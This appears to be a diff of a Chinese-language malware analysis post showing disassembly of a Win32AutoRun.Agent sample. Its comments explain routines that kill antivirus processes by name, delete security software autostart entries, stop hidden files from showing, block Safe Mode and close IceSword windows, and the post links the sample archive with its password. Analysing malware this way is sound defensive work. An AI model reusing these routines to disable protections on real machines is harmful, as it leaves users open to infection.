+10002A1D    E8 AEFDFFFF   call    100027D0  
+10002A22    68 B8180010   push    100018B8                   ; ASCII "safeboxTray.EXE"  
+10002A27    E8 A4FDFFFF   call    100027D0  
+10002A2C    68 A8180010   push    100018A8                   ; ASCII "AvMonitor.EXE"  
+10002A31    E8 9AFDFFFF   call    100027D0  
+10002A36    68 98180010   push    10001898                   ; ASCII "Ravservice.EXE"  
+10002A3B    E8 90FDFFFF   call    100027D0  
+10002A40    68 8C180010   push    1000188C                   ; ASCII "RAVTRAY.EXE"  
 .............................................................................................  
-10002A45    E8 86FDFFFF     call    100027D0  
-10002CE0    68 48150010     push    10001548                         ; ASCII "mcshield.EXE"  
-10002CE5    E8 E6FAFFFF     call    100027D0  
-10002CEA    68 94150010     push    10001594                         ; ASCII "VsTskMgr.EXE"  
-10002CEF    E8 DCFAFFFF     call    100027D0  
-10002CF4    68 38150010     push    10001538                         ; ASCII "KSWebShield.EXE"  
-10002CF9    E8 D2FAFFFF     call    100027D0  
-10002CFE    83C4 34         add     esp, 34  
-10002D01    C3              retn  
-  
+10002A45    E8 86FDFFFF   call    100027D0  
+
+10002CE0    68 48150010   push    10001548                   ; ASCII "mcshield.EXE"  
+10002CE5    E8 E6FAFFFF   call    100027D0  
+10002CEA    68 94150010   push    10001594                   ; ASCII "VsTskMgr.EXE"  
+```
+
+
+
+```
+10002CEF    E8 DCFAFFFF     call    100027D0  
+
+10002CF4    68 38150010     push    10001538                 ; ASCII "KSWebShield.EXE"  
+
+10002CF9    E8 D2FAFFFF     call    100027D0  
+
+10002CFE    83C4 34         add     esp, 34  
+
+10002D01    C3              retn  
+
 }  
-10002D23    E8 E8FBFFFF     call    10002910  
+
+10002D23    E8 E8FBFFFF     call    10002910  
+
 {  
-10002910    55              push    ebp  
-10002911    8BEC            mov     ebp, esp  
-10002913    83EC 08         sub     esp, 8  
-10002916    C745 F8 0200000>mov     dword ptr \[ebp-8\], 2  
-1000291D    90              nop  
-1000291E    90              nop  
-1000291F    90              nop  
-10002920    90              nop  
-10002921    90              nop  
-10002922    90              nop  
-10002923    8D45 FC         lea     eax, dword ptr \[ebp-4\]  
-10002926    50              push    eax  
-10002927    68 3F000F00     push    0F003F  
-1000292C    6A 00           push    0  
-1000292E    68 98140010     push    10001498                         ; ASCII  
- ；"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\advanced\\folder\\hidden\\showall"  
- ；修改注册表使隐藏文件属性失效，删除注册表相关键值破坏安全模式，阻止用户进入安全模式  
-10002933    68 02000080     push    80000002  
-10002938    FF15 04100010   call    dword ptr \[10001004\]             ; ADVAPI32.RegOpenKeyExA  
-1000293E    85C0            test    eax, eax  
-10002940    75 39           jnz     short 1000297B  
-10002942    8B55 FC         mov     edx, dword ptr \[ebp-4\]  
-10002945    8D4D F8         lea     ecx, dword ptr \[ebp-8\]  
-10002948    6A 04           push    4  
-1000294A    51              push    ecx  
-1000294B    6A 04           push    4  
-1000294D    50              push    eax  
-1000294E    68 88140010     push    10001488                         ; ASCII "CheckedValue"  
-10002953    52              push    edx  
-10002954    FF15 0C100010   call    dword ptr \[1000100C\]             ; ADVAPI32.RegSetValueExA  
-1000295A    85C0            test    eax, eax  
-1000295C    74 13           je      short 10002971  
-1000295E    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
-10002961    50              push    eax  
-10002962    FF15 1C100010   call    dword ptr \[1000101C\]             ; ADVAPI32.RegCloseKey  
-10002968    B8 01000000     mov     eax, 1  
-1000296D    8BE5            mov     esp, ebp  
-1000296F    5D              pop     ebp  
-10002970    C3              retn  
-  
+
+10002910    55              push    ebp  
+
+10002911    8BEC            mov     ebp, esp  
+
+10002913    83EC 08         sub     esp, 8  
+
+10002916    C745 F8 0200000>mov     dword ptr [ebp-8], 2  
+
+1000291D    90              nop  
+
+1000291E    90              nop  
+
+1000291F    90              nop  
+
+10002920    90              nop  
+
+10002921    90              nop  
+
+10002922    90              nop  
+
+10002923    8D45 FC         lea     eax, dword ptr [ebp-4]  
+
+10002926    50              push    eax  
+
+10002927    68 3F000F00     push    0F003F  
+
+1000292C    6A 00           push    0  
+
+1000292E    68 98140010     push    10001498                 ; ASCII  
+ ；"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\advanced\\folder\\hidden\\showall"  
+ ；修改注册表使隐藏文件属性失效，删除注册表相关键值破坏安全模式，阻止用户进入安全模式  
+
+10002933    68 02000080     push    80000002  
+
+10002938    FF15 04100010   call    dword ptr [10001004]         ; ADVAPI32.RegOpenKeyExA  
+
+1000293E    85C0            test    eax, eax  
+
+10002940    75 39           jnz     short 1000297B  
+
+10002942    8B55 FC         mov     edx, dword ptr [ebp-4]  
+
+10002945    8D4D F8         lea     ecx, dword ptr [ebp-8]  
+
+10002948    6A 04           push    4  
+
+1000294A    51              push    ecx  
+
+1000294B    6A 04           push    4  
+
+1000294D    50              push    eax  
+
+1000294E    68 88140010     push    10001488                 ; ASCII "CheckedValue"  
+
+10002953    52              push    edx  
+
+10002954    FF15 0C100010   call    dword ptr [1000100C]         ; ADVAPI32.RegSetValueExA  
+
+1000295A    85C0            test    eax, eax  
+
+1000295C    74 13           je      short 10002971  
+
+1000295E    8B45 FC         mov     eax, dword ptr [ebp-4]  
+
+10002961    50              push    eax  
+
+10002962    FF15 1C100010   call    dword ptr [1000101C]         ; ADVAPI32.RegCloseKey  
+
+10002968    B8 01000000     mov     eax, 1  
+
+1000296D    8BE5            mov     esp, ebp  
+
+1000296F    5D              pop     ebp  
+
+10002970    C3              retn  
+
 }  
-10002D28    E8 63FCFFFF     call    10002990  
-  {  
- 10002990    E8 6BFCFFFF     call    10002600                     ；阻止进入安全模式  
-10002995    E8 A6FDFFFF     call    10002740                      ；阻止网络连接安全模式  
-1000299A    68 2C150010     push    1000152C                         ; ASCII "360Safetray"  
-1000299F    E8 FCFCFFFF     call    100026A0                      ；删除安全软件自启动项  
-100029A4    68 20150010     push    10001520                         ; ASCII "360Safebox"  
-100029A9    E8 F2FCFFFF     call    100026A0  
-100029AE    68 14150010     push    10001514                         ; ASCII "KavStart"  
-100029B3    E8 E8FCFFFF     call    100026A0  
-100029B8    68 0C150010     push    1000150C                         ; ASCII "vptray"  
-100029BD    E8 DEFCFFFF     call    100026A0  
-100029C2    68 04150010     push    10001504                         ; ASCII "ccApp"  
-100029C7    E8 D4FCFFFF     call    100026A0  
-100029CC    68 FC140010     push    100014FC                         ; ASCII "RavTray"  
-100029D1    E8 CAFCFFFF     call    100026A0  
-100029D6    68 F4140010     push    100014F4                         ; ASCII "egui"  
-100029DB    E8 C0FCFFFF     call    100026A0  
-100029E0    68 EC140010     push    100014EC                         ; ASCII "essact"  
-100029E5    E8 B6FCFFFF     call    100026A0  
-100029EA    83C4 20         add     esp, 20  
-100029ED    C3              retn  
-  
+
+10002D28    E8 63FCFFFF     call    10002990  
+
+  {  
+ 10002990    E8 6BFCFFFF     call    10002600                 ；阻止进入安全模式  
+
+10002995    E8 A6FDFFFF     call    10002740                  ；阻止网络连接安全模式  
+
+1000299A    68 2C150010     push    1000152C                 ; ASCII "360Safetray"  
+
+1000299F    E8 FCFCFFFF     call    100026A0                  ；删除安全软件自启动项  
+
+100029A4    68 20150010     push    10001520                 ; ASCII "360Safebox"  
+
+100029A9    E8 F2FCFFFF     call    100026A0  
+
+100029AE    68 14150010     push    10001514                 ; ASCII "KavStart"  
+
+100029B3    E8 E8FCFFFF     call    100026A0  
+
+100029B8    68 0C150010     push    1000150C                 ; ASCII "vptray"  
+
+100029BD    E8 DEFCFFFF     call    100026A0  
+
+100029C2    68 04150010     push    10001504                 ; ASCII "ccApp"  
+
+100029C7    E8 D4FCFFFF     call    100026A0  
+
+100029CC    68 FC140010     push    100014FC                 ; ASCII "RavTray"  
+
+100029D1    E8 CAFCFFFF     call    100026A0  
+
+100029D6    68 F4140010     push    100014F4                 ; ASCII "egui"  
+
+100029DB    E8 C0FCFFFF     call    100026A0  
+
+100029E0    68 EC140010     push    100014EC                 ; ASCII "essact"  
+
+100029E5    E8 B6FCFFFF     call    100026A0  
+
+100029EA    83C4 20         add     esp, 20  
+
+100029ED    C3              retn  
+
 }  
-10002D2D  ^ EB E8           jmp     short 10002D17  
-10002D2F    90              nop  
-10002D30    81EC 28020000   sub     esp, 228  
-10002D36    56              push    esi  
-10002D37    8BB424 30020000 mov     esi, dword ptr \[esp+230\]  
-10002D3E    57              push    edi  
-10002D3F    56              push    esi  
-10002D40    6A 01           push    1  
-10002D42    68 FF0F1F00     push    1F0FFF  
-10002D47    FF15 5C100010   call    dword ptr \[1000105C\]             ; kernel32.OpenProcess  
-10002D4D    56              push    esi  
-10002D4E    6A 08           push    8  
-10002D50    8BF8            mov     edi, eax  
-10002D52    E8 D5060000     call    1000342C                         ; jmp 到 kernel32.CreateToolhelp32Snapshot  
-10002D57    8BF0            mov     esi, eax  
-10002D59    83FE FF         cmp     esi, -1  
-10002D5C    75 0B           jnz     short 10002D69  
-10002D5E    5F              pop     edi  
-10002D5F    33C0            xor     eax, eax  
-10002D61    5E              pop     esi  
-10002D62    81C4 28020000   add     esp, 228  
-10002D68    C3              retn  
-10002D69    8D4424 0C       lea     eax, dword ptr \[esp+C\]  
-10002D6D    C74424 0C 24020>mov     dword ptr \[esp+C\], 224  
-10002D75    50              push    eax  
-10002D76    56              push    esi  
-10002D77    E8 BC060000     call    10003438                         ; jmp 到 kernel32.Module32First  
-10002D7C    85C0            test    eax, eax  
-10002D7E    75 12           jnz     short 10002D92  
-10002D80    56              push    esi  
-10002D81    FF15 48100010   call    dword ptr \[10001048\]             ; kernel32.CloseHandle  
-10002D87    5F              pop     edi  
-10002D88    33C0            xor     eax, eax  
-10002D8A    5E              pop     esi  
-10002D8B    81C4 28020000   add     esp, 228  
-10002D91    C3              retn  
-  
+
+10002D2D  ^ EB E8           jmp     short 10002D17  
+
+10002D2F    90              nop  
+
+10002D30    81EC 28020000   sub     esp, 228  
+
+10002D36    56              push    esi  
+
+10002D37    8BB424 30020000 mov     esi, dword ptr [esp+230]  
+
+10002D3E    57              push    edi  
+
+10002D3F    56              push    esi  
+
+10002D40    6A 01           push    1  
+
+10002D42    68 FF0F1F00     push    1F0FFF  
+
+10002D47    FF15 5C100010   call    dword ptr [1000105C]         ; kernel32.OpenProcess  
+
+10002D4D    56              push    esi  
+
+10002D4E    6A 08           push    8  
+
+10002D50    8BF8            mov     edi, eax  
+
+10002D52    E8 D5060000     call    1000342C                 ; jmp 到 kernel32.CreateToolhelp32Snapshot  
+
+10002D57    8BF0            mov     esi, eax  
+
+10002D59    83FE FF         cmp     esi, -1  
+
+10002D5C    75 0B           jnz     short 10002D69  
+
+10002D5E    5F              pop     edi  
+
+10002D5F    33C0            xor     eax, eax  
+
+10002D61    5E              pop     esi  
+
+10002D62    81C4 28020000   add     esp, 228  
+
+10002D68    C3              retn  
+
+10002D69    8D4424 0C       lea     eax, dword ptr [esp+C]  
+
+10002D6D    C74424 0C 24020>mov     dword ptr [esp+C], 224  
+
+10002D75    50              push    eax  
+
+10002D76    56              push    esi  
+
+10002D77    E8 BC060000     call    10003438                 ; jmp 到 kernel32.Module32First  
+
+10002D7C    85C0            test    eax, eax  
+
+10002D7E    75 12           jnz     short 10002D92  
+
+10002D80    56              push    esi  
+
+10002D81    FF15 48100010   call    dword ptr [10001048]         ; kernel32.CloseHandle  
+
+10002D87    5F              pop     edi  
+
+10002D88    33C0            xor     eax, eax  
+
+10002D8A    5E              pop     esi  
+
+10002D8B    81C4 28020000   add     esp, 228  
+
+10002D91    C3              retn  
+
 }  
-10002573    6A 00           push    0  
-10002575    6A 00           push    0  
-10002577    FFD6            call    esi  
-10002579    6A 00           push    0  
-1000257B    6A 00           push    0  
-1000257D    6A 00           push    0  
-1000257F    68 C0250010     push    100025C0  
- {  
-  
-100025C0    56              push    esi                              ; kernel32.CreateThread  
-100025C1    8B35 94100010   mov     esi, dword ptr \[10001094\]        ; kernel32.Sleep  
-100025C7    68 34120010     push    10001234                         ; ASCII "IceSword"  
-100025CC    68 AC340010     push    100034AC  
-100025D1    68 20120010     push    10001220                         ; ASCII "AfxControlBar42s"  
-100025D6    E8 B5FEFFFF     call    10002490                         ；查找窗口发送消息结束兵刃  
-100025DB    83C4 0C         add     esp, 0C  
-100025DE    68 70170000     push    1770  
-100025E3    FFD6            call    esi  
-100025E5  ^ EB E0           jmp     short 100025C7  
-  
-  
+
+10002573    6A 00           push    0  
+
+10002575    6A 00           push    0  
+
+10002577    FFD6            call    esi  
+
+10002579    6A 00           push    0  
+
+1000257B    6A 00           push    0  
+
+1000257D    6A 00           push    0  
+
+1000257F    68 C0250010     push    100025C0  
+
+ {  
+100025C0    56              push    esi                     ; kernel32.CreateThread  
+
+100025C1    8B35 94100010   mov     esi, dword ptr [10001094]      ; kernel32.Sleep  
+
+100025C7    68 34120010     push    10001234                 ; ASCII "IceSword"  
+
+100025CC    68 AC340010     push    100034AC  
+
+100025D1    68 20120010     push    10001220                 ; ASCII "AfxControlBar42s"  
+
+100025D6    E8 B5FEFFFF     call    10002490                 ；查找窗口发送消息结束兵刃  
+
+100025DB    83C4 0C         add     esp, 0C  
+
+100025DE    68 70170000     push    1770  
+
+100025E3    FFD6            call    esi  
+
+100025E5  ^ EB E0           jmp     short 100025C7  
+
 }  
-10002584    6A 00           push    0  
-10002586    6A 00           push    0  
-10002588    FFD6            call    esi  
-1000258A    5E              pop     esi  
-1000258B    B8 01000000     mov     eax, 1  
-10002590    5D              pop     ebp  
-10002591    C2 0C00         retn    0C
+
+10002584    6A 00           push    0  
+
+10002586    6A 00           push    0  
+
+10002588    FFD6            call    esi  
+
+1000258A    5E              pop     esi  
+
+1000258B    B8 01000000     mov     eax, 1  
+
+10002590    5D              pop     ebp  
+
+10002591    C2 0C00         retn    0C
+```
 
 上传的附件
-| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || Win32AutoRun.Agent.rar 解压密码：pediy.com  
+
+| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || `Win32AutoRun.Agent.rar` 解压密码：`pediy.com`  
+
  |
